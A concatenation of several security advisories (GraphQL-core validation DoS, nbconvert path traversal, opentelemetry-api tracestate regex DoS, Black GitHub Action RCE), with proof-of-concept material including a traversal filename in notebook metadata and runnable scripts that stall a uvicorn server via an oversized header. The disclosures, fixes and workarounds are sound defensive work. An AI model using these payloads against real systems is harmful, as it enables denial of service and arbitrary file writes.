query = gen(200, 100)          # 364 KB, gzips to a few KB
document = parse(query)
start = time.perf_counter()
validate(schema, document)      # returns no errors — it just burns CPU
print(f"{(time.perf_counter() - start):.0f}s")
```

Measured on GraphQL-core 3.2.8 / CPython 3.12 / Linux x86_64:

| n | m | query size | validation time |
|---|---|---|---|
| 20 | 20 | 7.6 KB | 0.16 s |
| 50 | 50 | 46 KB | 5.2 s |
| 100 | 100 | 182 KB | 81 s |
| 200 | 100 | 364 KB | **319 s** |

Doubling `n` at fixed `m` quadruples the time, as expected for a quadratic outer loop
driving a quadratic inner walk.

### Impact

Denial of service. One request pins one worker process for minutes; because CPython
holds the GIL for this pure-CPU work, a handful of concurrent requests can saturate a
typical multi-worker deployment. No authentication is required, and no data is
disclosed or modified.

### Patches

Fixed in **3.2.12** and **3.3.0rc1**.

Validation now enforces a per-document comparison budget. Once
`MAX_FIELD_COMPARISONS` (default `250_000`) pairwise comparisons have been made, the
rule aborts and reports a `GraphQLError` instead of running to completion:

> Query is too complex to validate for overlapping fields: exceeded 250000 field
> comparisons. Validation was aborted.

The default is far above what any realistic query reaches. It is a module-level
constant and can be raised or lowered:

```python
from graphql.validation.rules import overlapping_fields_can_be_merged

overlapping_fields_can_be_merged.MAX_FIELD_COMPARISONS = 1_000_000
```

Note the behaviour change: a pathological query that previously validated — slowly —
now produces a validation error.

### Workarounds

If you cannot upgrade, reject oversized documents before they reach `validate()`.
Note that a request body-size limit must be applied to the **decompressed** body to be
effective here, since the payload is highly compressible. Removing
`OverlappingFieldsCanBeMergedRule` from the rule set is *not* a safe workaround: it is
a correctness rule required by the specification.

A body-size limit remains worthwhile after upgrading — the comparison budget bounds
this specific rule, not overall request cost.

### Credits

Reported by @BZHunt, who also reviewed the fixes
before release. In memory of ZaX, who was the driving force behind this discovery.

Independently found and diagnosed by @bcmyguest, who
also proposed a fix.

cwe.name: Uncontrolled Resource Consumption

cves.summary:
### Summary

nbconvert <= v7.17.1 has an arbitrary file write vulnerability due to a path traversal in ipynb cell output metadata, more specifically on the filename attribute.

Vulnerable converters : `--to markdown`, `--to latex`, `--to rst`, `--to asciidoc`.

In `ExtractOutputPreprocessor`, `extractoutput.py:116-119` joins attacker-controlled  `path` to `output_files_dir` with no canonicalization check, enabling arbitrary file write.

This is a sibling vulnerability of https://github.com/advisories/GHSA-4c99-qj7h-p3vg.

### Impact

If a victim runs nbconvert on a malicious ipynb file, it can create some files with arbitrary data in arbitrary locations, i.e. override authorized_keys.

Note that running the cell with jupyter overrides the output, so it would "clean up" malicious cells.

### PoC

In a ipynb file:

```json

"cells": [{
        "cell_type": "code", "id": "abc123", "execution_count": 1,
        "metadata": {}, "source": "# PoC",
        "outputs": [{
            "output_type": "display_data",
            "metadata": {
                "filename": "../../../tmp/PWNED.png"  # ← traverses outside output_dir
            },
            "data": {
                # minimal valid PNG (1×1 pixel)
                "image/png": "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
            }
        }]
    }]

```

### Patches

Fixed in 
- https://github.com/jupyter/nbconvert/commit/ce4bd99aec31d81d759fa8eeb8643179392ec66f
- [7.17.2](https://github.com/jupyter/nbconvert/releases/tag/v7.17.2)

cwe.name: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

cves.summary:
## Summary
`TraceState.from_header` splits the inbound W3C `tracestate` header with a regular expression that starts with an unbounded optional-whitespace run, and no length limit is applied first. A run of spaces or tabs that is not followed by a comma costs O(N²) CPU. A single unauthenticated request with a ~100 KB `tracestate` keeps the handling worker busy for ~6 s (spaces) to ~12 s (tabs); under an asyncio server it blocks every other connection for that time.

## Affected component / version
- Package: `opentelemetry-api` (pip) — `opentelemetry/trace/span.py` (`TraceState.from_header`), reached from `opentelemetry/trace/propagation/tracecontext.py` (`TraceContextTextMapPropagator.extract`).
- Confirmed in `main` (5e8083e8) and in the v1.44.0 and v1.45.0 tags; the same pattern is present back to v1.0.0 (introduced by #1599, March 2021). Not exhaustively verified against every release in between.
- Reachable with the default propagators (`OTEL_PROPAGATORS` defaults to `tracecontext,baggage`) from any server instrumentation that calls `propagate.extract()`, for example `opentelemetry-instrumentation-asgi`.

## Details

1. The header reaches the parser without any length check:

```python
# opentelemetry-api/src/opentelemetry/trace/propagation/tracecontext.py:57
tracestate_headers = getter.get(carrier, self._TRACESTATE_HEADER_NAME)  # <-- attacker-controlled request header(s), any size
if tracestate_headers is None:
    tracestate = None
else:
    tracestate = TraceState.from_header(tracestate_headers)             # <-- no length check before parsing (line 61)
```

2. The split pattern and the parser:
```python
# opentelemetry-api/src/opentelemetry/trace/span.py:45
_TRACECONTEXT_MAXIMUM_TRACESTATE_KEYS = 32            # <-- only enforced later, in TraceState.__init__, after the split
_delimiter_pattern = re.compile(r"[ \t]*,[ \t]*")      # <-- (line 46) starts with an unbounded [ \t]*

# span.py:382
@classmethod
def from_header(cls, header_list: list[str]) -> TraceState:
    pairs = {}  # type: dict[str, str]
    for header in header_list:
        members: list[str] = re.split(_delimiter_pattern, header)   # <-- (line 400) VULNERABLE: O(N^2) on "a=b" + " " * N + "x"
        for member in members:
            if not member:
                continue
            match = _member_pattern.fullmatch(member)
            if not match:
                _logger.warning(                                    # <-- also logs the entire malformed member (up to the whole header)
                    "Member doesn't match the w3c identifiers format %s",
                    member,
                )
                return cls()
            ...
```

`re.split` tries the pattern at every offset. At each offset inside a whitespace run, `[ \t]*` consumes the rest of the run, finds no `,`, backtracks and fails, then the engine moves one character forward and repeats. N characters × up to N steps each = O(N²). The 32-member limit never gets a chance to run because `split` has to finish first.

3. The sibling propagator already has the missing guard:
```python
# baggage/propagation/__init__.py:68
_MAX_HEADER_LENGTH = 8192
...
if len(header.encode()) > self._MAX_HEADER_LENGTH:   # <-- (line 93) rejected before any regex runs; tracestate has no equivalent
    _logger.warning(...)
    return context
```

A 16 KiB header costs ≈ 0.25 s and an 8 KiB header ≈ 0.07 s.
Measured cost of `extract()` on one core (valid `traceparent`, `tracestate: "a=b" + N spaces + "x"`): the time quadruples each time N doubles (see the proof of concept). Roughly 0.06 s at 10,000 characters, 1 s at 40,000, 4 s at 80,000, 9 s at 100,000 (tabs are about 1.6× slower). 

Whether a server lets such a header through (header-size limits, tested): gunicorn rejects ≥ 8190 bytes (response code 431); `uvicorn --http h11` rejects above 16 KiB (400); waitress accepts up to 256 KiB (200 KB accepted, 300 KB rejected); `uvicorn --http httptools` — the default parser with `uvicorn[standard]` — accepted 300 KB, 1 MB, 5 MB and 20 MB `tracestate` headers.

## Proof of concept

### A. Show the quadratic cost (no server needed)

1. Install the API: `pip install opentelemetry-api` (any version from 1.0 up to the current main is affected).
2. Save as `poc_tracestate.py`:
```python
import logging
import time

from opentelemetry.trace.propagation.tracecontext import TraceContextTextMapPropagator

# The library logs the whole malformed member at WARNING; silence it so the timings stay readable.
logging.disable(logging.CRITICAL)

TRACEPARENT = "00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01"
propagator = TraceContextTextMapPropagator()

previous = None
for n in (10_000, 20_000, 40_000, 80_000):
    # N spaces after a valid member, no comma anywhere in the header
    carrier = {"traceparent": TRACEPARENT, "tracestate": "a=b" + " " * n + "x"}
    start = time.perf_counter()
    propagator.extract(carrier)
    elapsed = time.perf_counter() - start
    growth = f"x{elapsed / previous:.1f}" if previous else "-"
    print(f"{n:>7} characters  {elapsed:6.2f} s  growth when size doubles: {growth}")
    previous = elapsed
```
3. Run `python poc_tracestate.py`.
4. **What to observe:** the time grows by about **×4 every time the input size doubles** (a linear parser would show ×2). Absolute numbers depend on the CPU; the growth factor does not. Our run:
```
  10000 characters    0.06 s  growth when size doubles: -
  20000 characters    0.26 s  growth when size doubles: x4.0
  40000 characters    1.04 s  growth when size doubles: x4.0
  80000 characters    4.13 s  growth when size doubles: x4.0
```
Replace `" "` with `"\t"` to see ≈1.6× longer.

### B. Show that one request stalls a real server
This uses `OpenTelemetryMiddleware` from `opentelemetry-instrumentation-asgi` around a trivial ASGI app and the default `uvicorn[standard]` parser (httptools).

1. Install: `pip install opentelemetry-api opentelemetry-instrumentation-asgi "uvicorn[standard]"`.
2. Save as `app.py`:
```python
from opentelemetry.instrumentation.asgi import OpenTelemetryMiddleware

async def app(scope, receive, send):
    await send({"type": "http.response.start", "status": 200, "headers": [(b"content-type", b"text/plain")]})
    await send({"type": "http.response.body", "body": b"ok"})

app = OpenTelemetryMiddleware(app)
```
3. Start the server in one terminal: `uvicorn app:app --host 127.0.0.1 --port 8000 --http httptools`
4. Save as `attack.py`:
```python
"""Send one oversized tracestate request and, while it is being handled,
measure how long an unrelated request to the same server has to wait."""
import socket
import sys
import threading
import time

HOST, PORT = "127.0.0.1", 8000
N = int(sys.argv[1]) if len(sys.argv) > 1 else 100_000
TRACEPARENT = "00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01"

def get(path, extra=""):
    s = socket.create_connection((HOST, PORT), timeout=120)
    s.sendall(f"GET {path} HTTP/1.1\r\nHost: x\r\nConnection: close\r\n{extra}\r\n".encode())
    start, data = time.perf_counter(), b""
    while chunk := s.recv(65536):
        data += chunk
    return time.perf_counter() - start, data.split(b"\r\n")[0].decode()

result = {}
extra = f"traceparent: {TRACEPARENT}\r\ntracestate: a=b{' ' * N}x\r\n"
attacker = threading.Thread(target=lambda: result.update(a=get("/attack", extra)))
print("idle /ping:               %.3f s  %s" % get("/ping"))
attacker.start()
time.sleep(0.5)  # let the attack request reach the server first
print("/ping during the attack:  %.3f s  %s" % get("/ping"))
attacker.join()
print("attack request itself:    %.3f s  %s" % result["a"])
```
5. In a second terminal run `python attack.py 100000`.
6. **What to observe:** the idle `/ping` answers in milliseconds, but a `/ping` sent half a second *after* the attack request has to wait for the attack request to finish, even though it is a different, innocent request. Our run:
```
idle /ping:               0.000 s  HTTP/1.1 200 OK
/ping during the attack:  5.909 s  HTTP/1.1 200 OK     <-- unrelated request delayed ~6 s (event loop blocked)
attack request itself:    6.408 s  HTTP/1.1 200 OK
```
7. Start the server with `--http h11` instead and run the same command: the attack request is rejected immediately (`400 Bad Request`, h11 header cap) and `/ping` is not delayed. Our measurements for `--http httptools`: 30,000 spaces → 0.59 s; 100,000 spaces → 6.57 s with the concurrent `/ping` delayed 6.07 s; 100,000 tabs → 12.39 s with the concurrent `/ping` delayed 11.89 s.

## Severity
**Likelihood: Low.** Any unauthenticated client can trigger it with one request on the default propagators, but only on servers that accept headers larger than roughly 16–30 KB.

**Impact: Medium.** One request of about 100 KB costs 6–12 s of server CPU and, under an asyncio server, stalls every other connection for that time; repeating it keeps the service unavailable.

**Severity: Medium.**

## Suggested remediation
Replace the regex split with a plain `split` and strip; this removes the quadratic behaviour and is equivalent on valid input:
```diff
a/opentelemetry-api/src/opentelemetry/trace/span.py
+++ b/opentelemetry-api/src/opentelemetry/trace/span.py
@@ def from_header(cls, header_list: list[str]) -> TraceState:
         for header in header_list:
-            members: list[str] = re.split(_delimiter_pattern, header)
+            members: list[str] = [m.strip(" \t") for m in header.split(",")]
```
`_delimiter_pattern` (line 46) is then unused and can be removed. We also suggest rejecting a header longer than the W3C limit (512 characters for the list) before parsing, the way the baggage propagator does with `_MAX_HEADER_LENGTH`. On valid input the two forms return identical members (empty members preserved); the only behaviour change is that a header with leading whitespace is now accepted instead of producing an empty `TraceState`, which is more spec-compliant. Cost at N = 100,000 drops from ~9 s to ~5e-5 s.

## Credit

Discovered and reported by SecDim Security Research
secdim.com | @secdim | security@secdim.com

**FROM MAINTAINERS**

## Summary

`TraceState.from_header()` in `opentelemetry-api` used a regular-expression-based operation whose processing time could grow disproportionately when parsing specially crafted inbound `tracestate` headers.

Because W3C Trace Context is enabled by default in OpenTelemetry Python, services accepting untrusted propagation headers could spend excessive CPU time processing a single request.

## Impact

Services accepting untrusted inbound propagation headers may experience increased per-request CPU usage when processing malformed `tracestate` values. In synchronous servers, this may keep a worker occupied. In asynchronous servers, CPU-intensive parsing may delay other requests handled by the same event loop.

The practical impact depends on the HTTP server, HTTP parser, and any upstream request-header limits. Common servers and proxies may reject oversized headers before they reach the application, while custom carriers or deployments with increased header limits may accept substantially larger values.

Unlike optional propagation formats, W3C Trace Context is part of the default OpenTelemetry Python propagation configuration.

The impact is limited to availability. This issue does not expose or modify telemetry data and does not allow code execution.

## Patches

Versions of `opentelemetry-api` up to and including `1.45.0` are affected.

Upgrade `opentelemetry-api` to version `1.45.1` or later.

Version `1.45.1` replaces the affected parsing operation with linear-time processing and discards combined `tracestate` headers longer than 8,192 characters.

## Workarounds

Ensure HTTP header size limits are configured at the server or gateway level. Most Python HTTP servers enforce an 8 KiB header limit by default, which mitigates external attack vectors independently of this fix.

cves.summary:
### Summary

The GitHub Action bundled with Black can read the version from `tool.black.required-version` if `use_pyproject` is set to True. This version is not validated and therefore can be used to execute untrusted code in the context of a victim's repository.

### Details

This is similar to the previous CVE-2026-31900. The value in `tool.black.required-version` is accepted as the version to be installed by the action without validation.

### Proof of concept

Reproduction requires a victim to use Black's GitHub Action with `use_pyproject: true`. The attacker would then issue a PR to the victim's repository with `pyproject.toml` edited so that Black points to a malicious repository.

### Impact

This is a remote code execution vulnerability impacting users using the GitHub Action bundled with psf/black and using the `use_pyproject: true` setting.
